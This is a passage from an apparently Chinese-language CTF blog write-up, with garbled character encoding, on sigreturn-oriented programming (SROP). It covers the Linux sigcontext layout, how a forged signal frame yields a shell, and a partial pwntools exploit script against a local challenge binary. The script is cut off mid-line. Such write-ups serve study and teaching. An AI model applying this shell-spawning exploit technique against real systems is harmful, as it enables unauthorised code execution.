class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  __uint32_t        mxcr_mask<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_fpxreg</span>    _st<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_xmmreg</span>    _xmm<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  __uint32_t        padding<span class=\"token punctuation\">[</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sigcontext</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  __uint64_t r8<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  __uint64_t r9<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  __uint64_t r10<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  __uint64_t r11<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  __uint64_t r12<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  __uint64_t r13<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  __uint64_t r14<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  __uint64_t r15<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  __uint64_t rdi<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  __uint64_t rsi<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  __uint64_t rbp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  __uint64_t rbx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  __uint64_t rdx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>  __uint64_t rax<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  __uint64_t rcx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  __uint64_t rsp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  __uint64_t rip<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  __uint64_t eflags<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> cs<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> gs<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> fs<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> __pad0<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  __uint64_t err<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  __uint64_t trapno<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  __uint64_t oldmask<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>  __uint64_t cr2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>  __extension__ <span class=\"token keyword\">union</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>      <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_fpstate</span> <span class=\"token operator\">*</span> fpstate<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>      __uint64_t __fpstate_word<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>  __uint64_t __reserved1 <span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ol start=\"3\">\n<li>signal handler ËøîÂõûÂêéÔºåÂÜÖÊ†∏‰∏∫ÊâßË°å sigreturn Á≥ªÁªüË∞ÉÁî®Ôºå‰∏∫ËØ•ËøõÁ®ãÊÅ¢Â§ç‰πãÂâç‰øùÂ≠òÁöÑ‰∏ä‰∏ãÊñáÔºåÂÖ∂‰∏≠ÂåÖÊã¨Â∞ÜÊâÄÊúâÂéãÂÖ•ÁöÑÂØÑÂ≠òÂô®ÔºåÈáçÊñ∞ pop ÂõûÂØπÂ∫îÁöÑÂØÑÂ≠òÂô®ÔºåÊúÄÂêéÊÅ¢Â§çËøõÁ®ãÁöÑÊâßË°å„ÄÇÂÖ∂‰∏≠Ôºå**32 ‰ΩçÁöÑ sigreturn ÁöÑË∞ÉÁî®Âè∑‰∏∫ <u>119(0x77)</u>Ôºå64 ‰ΩçÁöÑÁ≥ªÁªüË∞ÉÁî®Âè∑‰∏∫ <u>15(0xf)</u></li>\n</ol>\n<h2 id=\"ÊîªÂáªÂéüÁêÜ\"><a class=\"markdownIt-Anchor\" href=\"#ÊîªÂáªÂéüÁêÜ\">#</a> ÊîªÂáªÂéüÁêÜ</h2>\n<p>‰ªîÁªÜÂõûÈ°æ‰∏Ä‰∏ãÂÜÖÊ†∏Âú® signal ‰ø°Âè∑Â§ÑÁêÜÁöÑËøáÁ®ã‰∏≠ÁöÑÂ∑•‰ΩúÔºåÊàë‰ª¨ÂèØ‰ª•ÂèëÁé∞ÔºåÂÜÖÊ†∏‰∏ªË¶ÅÂÅöÁöÑÂ∑•‰ΩúÂ∞±ÊòØ‰∏∫ËøõÁ®ã‰øùÂ≠ò‰∏ä‰∏ãÊñáÔºåÂπ∂‰∏îÊÅ¢Â§ç‰∏ä‰∏ãÊñá„ÄÇËøô‰∏™‰∏ªË¶ÅÁöÑÂèòÂä®ÈÉΩÂú® Signal Frame ‰∏≠„ÄÇ‰ΩÜÊòØÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºö</p>\n<ul>\n<li>Signal Frame Ë¢´‰øùÂ≠òÂú®Áî®Êà∑ÁöÑÂú∞ÂùÄÁ©∫Èó¥‰∏≠ÔºåÊâÄ‰ª•Áî®Êà∑ÊòØÂèØ‰ª•ËØªÂÜôÁöÑ„ÄÇ</li>\n<li>Áî±‰∫éÂÜÖÊ†∏‰∏é‰ø°Âè∑Â§ÑÁêÜÁ®ãÂ∫èÊó†ÂÖ≥ (kernel agnostic about signal handlers)ÔºåÂÆÉÂπ∂‰∏ç‰ºöÂéªËÆ∞ÂΩïËøô‰∏™ signal ÂØπÂ∫îÁöÑ Signal FrameÔºåÊâÄ‰ª•ÂΩìÊâßË°å sigreturn Á≥ªÁªüË∞ÉÁî®Êó∂ÔºåÊ≠§Êó∂ÁöÑ Signal Frame Âπ∂‰∏ç‰∏ÄÂÆöÊòØ‰πãÂâçÂÜÖÊ†∏‰∏∫Áî®Êà∑ËøõÁ®ã‰øùÂ≠òÁöÑ Signal Frame„ÄÇ</li>\n</ul>\n<h3 id=\"Ëé∑Âèñ-shell\"><a class=\"markdownIt-Anchor\" href=\"#Ëé∑Âèñ-shell\">#</a> Ëé∑Âèñ shell</h3>\n<p>È¶ñÂÖàÔºåÊàë‰ª¨ÂÅáËÆæÊîªÂáªËÄÖÂèØ‰ª•ÊéßÂà∂Áî®Êà∑ËøõÁ®ãÁöÑÊ†àÔºåÈÇ£‰πàÂÆÉÂ∞±ÂèØ‰ª•‰º™ÈÄ†‰∏Ä‰∏™ Signal FrameÔºåÂ¶Ç‰∏ãÂõæÊâÄÁ§∫ÔºåËøôÈáå‰ª• 64 ‰Ωç‰∏∫‰æãÂ≠êÔºåÁªôÂá∫ Signal Frame Êõ¥Âä†ËØ¶ÁªÜÁöÑ‰ø°ÊÅØ</p>\n<p><img data-src=\"/img/srop/srop-example-1.png\" alt=\"signal2-stack\"></p>\n<p>ÂΩìÁ≥ªÁªüÊâßË°åÂÆå sigreturn Á≥ªÁªüË∞ÉÁî®‰πãÂêéÔºå‰ºöÊâßË°å‰∏ÄÁ≥ªÂàóÁöÑ pop Êåá‰ª§‰ª•‰æø‰∫éÊÅ¢Â§çÁõ∏Â∫îÂØÑÂ≠òÂô®ÁöÑÂÄºÔºåÂΩìÊâßË°åÂà∞ rip Êó∂ÔºåÂ∞±‰ºöÂ∞ÜÁ®ãÂ∫èÊâßË°åÊµÅÊåáÂêë syscall Âú∞ÂùÄÔºåÊ†πÊçÆÁõ∏Â∫îÂØÑÂ≠òÂô®ÁöÑÂÄºÔºåÊ≠§Êó∂Ôºå‰æø‰ºöÂæóÂà∞‰∏Ä‰∏™ shell„ÄÇ___(Áõ∏ÂΩì‰∫éËøòÂéüÊàë‰ª¨Ë∞ÉÂ•ΩÁöÑÂØÑÂ≠òÂô®ÁöÑÂÄº)</p>\n<h3 id=\"system-call-chains\"><a class=\"markdownIt-Anchor\" href=\"#system-call-chains\">#</a> system call chains</h3>\n<p>ÈúÄË¶ÅÊåáÂá∫ÁöÑÊòØÔºå‰∏äÈù¢ÁöÑ‰æãÂ≠ê‰∏≠ÔºåÊàë‰ª¨Âè™ÊòØÂçïÁã¨ÁöÑËé∑Âæó‰∏Ä‰∏™ shell„ÄÇÊúâÊó∂ÂÄôÔºåÊàë‰ª¨ÂèØËÉΩ‰ºöÂ∏åÊúõÊâßË°å‰∏ÄÁ≥ªÂàóÁöÑÂáΩÊï∞„ÄÇÊàë‰ª¨Âè™ÈúÄË¶ÅÂÅö‰∏§Â§Ñ‰øÆÊîπÂç≥ÂèØ</p>\n<ul>\n<li><strong>ÊéßÂà∂Ê†àÊåáÈíà„ÄÇ</strong></li>\n<li><strong>ÊääÂéüÊù• rip ÊåáÂêëÁöÑ <code>syscall</code>  gadget Êç¢Êàê <code>syscall; ret</code>  gadget„ÄÇ</strong></li>\n</ul>\n<p>Â¶Ç‰∏ãÂõæÊâÄÁ§∫ ÔºåËøôÊ†∑ÂΩìÊØèÊ¨° syscall ËøîÂõûÁöÑÊó∂ÂÄôÔºåÊ†àÊåáÈíàÈÉΩ‰ºöÊåáÂêë‰∏ã‰∏Ä‰∏™ Signal Frame„ÄÇÂõ†Ê≠§Â∞±ÂèØ‰ª•ÊâßË°å‰∏ÄÁ≥ªÂàóÁöÑ sigreturn ÂáΩÊï∞Ë∞ÉÁî®„ÄÇ</p>\n<p><img data-src=\"/img/srop/srop-example-2.png\" alt=\"signal2-stack\"></p>\n<h3 id=\"ÂêéÁª≠\"><a class=\"markdownIt-Anchor\" href=\"#ÂêéÁª≠\">#</a> ÂêéÁª≠ <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9hZHZhbmNlZC1yb3Avc3JvcC8jXzM=\">¬∂</span></h3>\n<p>ÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºåÊàë‰ª¨Âú®ÊûÑÈÄ† ROP ÊîªÂáªÁöÑÊó∂ÂÄôÔºåÈúÄË¶ÅÊª°Ë∂≥‰∏ãÈù¢ÁöÑÊù°‰ª∂</p>\n<ul>\n<li><strong>ÂèØ‰ª•ÈÄöËøáÊ†àÊ∫¢Âá∫Êù•ÊéßÂà∂Ê†àÁöÑÂÜÖÂÆπ</strong></li>\n<li>ÈúÄË¶ÅÁü•ÈÅìÁõ∏Â∫îÁöÑ **<u>Âú∞ÂùÄ</u>**\n<ul>\n<li><strong>&quot;/bin/sh&quot;</strong></li>\n<li><strong>Signal Frame</strong></li>\n<li><strong>syscall</strong></li>\n<li><strong>sigreturn</strong></li>\n</ul>\n</li>\n<li>ÈúÄË¶ÅÊúâÂ§üÂ§ßÁöÑÁ©∫Èó¥Êù•Â°û‰∏ãÊï¥‰∏™ sigal frame</li>\n</ul>\n<p>Ê≠§Â§ñÔºåÂÖ≥‰∫é sigreturn ‰ª•Âèä syscall;ret Ëøô‰∏§‰∏™ gadget Âú®‰∏äÈù¢Âπ∂Ê≤°ÊúâÊèêÂèä„ÄÇÊèêÂá∫ËØ•ÊîªÂáªÁöÑËÆ∫Êñá‰ΩúËÄÖÂèëÁé∞‰∫ÜËøô‰∫õ gadgets Âá∫Áé∞ÁöÑÊüê‰∫õÂú∞ÂùÄÔºö</p>\n<h2 id=\"‰∏ÄÈÅì‰æãÈ¢ò\"><a class=\"markdownIt-Anchor\" href=\"#‰∏ÄÈÅì‰æãÈ¢ò\">#</a> ‰∏ÄÈÅì‰æãÈ¢ò</h2>\n<h3 id=\"Ê£ÄÊü•\"><a class=\"markdownIt-Anchor\" href=\"#Ê£ÄÊü•\">#</a> Ê£ÄÊü•</h3>\n<p><img data-src=\"/img/srop/image-20230803220602093.png\" alt=\"image-20230803220602093\"></p>\n<p><img data-src=\"/img/srop/image-20230803220635434.png\" alt=\"image-20230803220635434\"></p>\n<p>ÂèëÁé∞ËæìÂÖ•ÂæàÂ∞ëÂ≠óÁ¨¶ÔºåÁ®ãÂ∫èÂ∞±Â¥©Ê∫É„ÄÇÂ†ÜÊ†à‰∏çÂèØÊâßË°å„ÄÇ</p>\n<h3 id=\"ida\"><a class=\"markdownIt-Anchor\" href=\"#ida\">#</a> IDA</h3>\n<p><img data-src=\"/img/srop/image-20230803220825554.png\" alt=\"image-20230803220825554\"></p>\n<p><img data-src=\"/img/srop/image-20230803220903459.png\" alt=\"image-20230803220903459\"></p>\n<p><img data-src=\"/img/srop/image-20230803220926236.png\" alt=\"image-20230803220926236\"></p>\n<p>mian ÂáΩÊï∞ËøõÂÖ• vulnÔºåÂæàÂÆπÊòìÂèëÁé∞ vuln ÂáΩÊï∞Ë∞ÉÁî® sys_read Âíå sys_write Á≥ªÁªüË∞ÉÁî®ÂáΩÊï∞„ÄÇÂÖ∂‰∏≠Âú® buf ‰∏≠ÊúâÊºèÊ¥ûÁÇπ„ÄÇÂπ∂ÂèëÁé∞ gadgets ‰∏≠Êúâ</p>\n<pre><code class=\"language-commonlisp\"># 00000000004004DA                 mov     rax, 0Fh\n</code></pre>\n<p>ÊâÄ‰ª•ÂæàÊòéÊòæÂèØ‰ª•ËøõË°å srop„ÄÇ</p>\n<p>srop ËææÊàêÊîªÂáªÁöÑÊù°‰ª∂ÊòØ‰∏Ä‰∏ãÂÜÖÂÆπÔºö</p>\n<ul>\n<li><strong>ÂèØ‰ª•ÈÄöËøáÊ†àÊ∫¢Âá∫Êù•ÊéßÂà∂Ê†àÁöÑÂÜÖÂÆπ</strong></li>\n<li>ÈúÄË¶ÅÁü•ÈÅìÁõ∏Â∫îÁöÑ **<u>Âú∞ÂùÄ</u>**\n<ul>\n<li><strong>&quot;/bin/sh&quot;</strong></li>\n<li><strong>Signal Frame</strong></li>\n<li><strong>syscall</strong></li>\n<li><strong>sigreturn</strong></li>\n</ul>\n</li>\n<li>ÈúÄË¶ÅÊúâÂ§üÂ§ßÁöÑÁ©∫Èó¥Êù•Â°û‰∏ãÊï¥‰∏™ sigal frame</li>\n</ul>\n<p>Ê£ÄÊü•Â≠óÁ¨¶‰∏≤Âπ∂Ê≤°Êúâ binshÔºåÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•Áî® sys_read ËØªÂÖ•ÔºåÂéªÊ≥ÑÈú≤Ê†àÁöÑÂü∫ÂùÄÔºåÁÑ∂ÂêéÂéªËÆ°ÁÆó binsh Âú®Ê†à‰∏≠ÁöÑÂÅèÁßª„ÄÇÂõ†‰∏∫ËôΩÁÑ∂Á®ãÂ∫èËøúÁ®ãÂíåÊú¨Âú∞Âä†ËΩΩ‰∏çÂêåÔºå‰ΩÜÊòØ bin/sh ËØªÂÖ•ÁöÑÂÅèÁßªÊòØÁõ∏ÂêåÁöÑ„ÄÇÊ†πÊçÆËøô‰∏™ÂéüÁêÜÔºåÊàë‰ª¨ÂéªËÆ°ÁÆóÊú¨Âú∞Ë∞ÉËØïÁöÑ /bin/sh ÁöÑÂÅèÁßª</p>\n<p>‰ΩÜËøôÈ¢òÊàë‰ª¨Âπ∂‰∏çÁü•ÁöÑÂéªÂ¶Ç‰ΩïÊ≥ÑÈú≤Ê†àÁöÑÂü∫ÂùÄÔºåÈÇ£ËØ•ÂíãÂäû„ÄÇÂá°‰∫ãÂÖàË∞ÉËØïÂÜçËØ¥„ÄÇ</p>\n<p>main ÂáΩÊï∞‰πãÂâçËÆ∞ÂΩï rsi</p>\n<p><img data-src=\"/img/srop/image-20230803222622304.png\" alt=\"image-20230803222622304\"></p>\n<p>ËæìÂÖ• /bin/sh ËÆ∞ÂΩï rsi</p>\n<p><img data-src=\"/img/srop/image-20230803222733528.png\" alt=\"image-20230803222733528\"></p>\n<p>‰ªé rsi ‰∏≠ÔºåÊàë‰ª¨ËÉΩÂæóÂà∞ bin/sh Âú®Ê†à‰∏≠ÁöÑÂÅèÁßª ‚Äî‚Äî 0x7fffffffddf8 - 0x7fffffffdce0</p>\n<p><img data-src=\"/img/srop/image-20230803223305868.png\" alt=\"image-20230803223305868\"></p>\n<p>‰ªéËøôÈáåÊàë‰ª¨Â∞±ËÉΩÂèëÁé∞ ‚Äî‚Äîwrite ÊâìÂç∞Âá∫ 0x30 ‰∏™Â≠óËäÇÔºåÂèØ‰ª•ÁúãÂá∫‰ªé‰ΩéÂú∞ÂùÄÂºÄÂßãÊâìÂç∞ 0x20 ‰∏™Â≠óËäÇÂêé 0x8 Â∞±ÊòØÊ†àÂü∫ÂùÄ</p>\n<p>ÊâÄ‰ª•ÈÄöËøá write ÂáΩÊï∞ËÉΩÊâìÂç∞Âá∫ libc Ê†àÂü∫ÂùÄ</p>\n<p>ÊâìÂç∞ÂÆåÊ†àÂü∫ÂùÄÊàë‰ª¨Â∞±ËÉΩÈÄöËøáÂÅèÁßªËÆ°ÁÆóÂá∫ binsh ÁöÑÂü∫ÂùÄ‰∫Ü„ÄÇ</p>\n<p>ÊÄùË∑ØÊúâ‰∫ÜÔºåÁõ¥Êé•‰∏ä exp</p>\n<h3 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#r = remote('node2.anna.nssctf.cn',28450)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>r <span class=\"token operator\">=</span> gdb<span class=\"token punctuation\">.</span>debug<span class=\"token punctuation\">(</span><span class=\"token string\">'./PWN3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># r = process('./PWN3')</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># libc = ELF('/home/f145h/Desktop/libs/2.23-0ubuntu11.3_amd64/libc.so.6')</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./PWN3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># ld-linux-x86-64.so.2</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #ËÆæÁΩÆÁßçÂ≠ê</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'F145H'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'F'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>vuln <span class=\"token operator\">=</span> <span class=\"token number\">0x4004ED</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'/bin/sh\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">2</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>vuln<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'‰º†Ëæì/bin/sh‰πãÂâç======>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>sl<span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'‰º†Ëæì/bin/sh‰πãÂêé======>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>of <span class=\"token operator\">=</span> <span class=\"token number\">0x7fffffffde28</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x7fffffffdd10</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token string\">'of ËÆ°ÁÆóbinshÂú®Ê†àÁöÑÂÅèÁßª'</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>l_stack <span class=\"token operator\">=</span> lic<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"42\"></td><td><pre>binsh <span class=\"token operator\">=</span> l_stack <span class=\"token operator\">-</span> of</pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>l_stack<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'binsh_addr=======>'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>syscall <span class=\"token operator\">=</span> <span class=\"token number\">0x400501</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token comment\"># 00000000004004DA                 mov     rax, 0Fh</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>sigreturn  <span class=\"token operator\">=</span> <span class=\"token 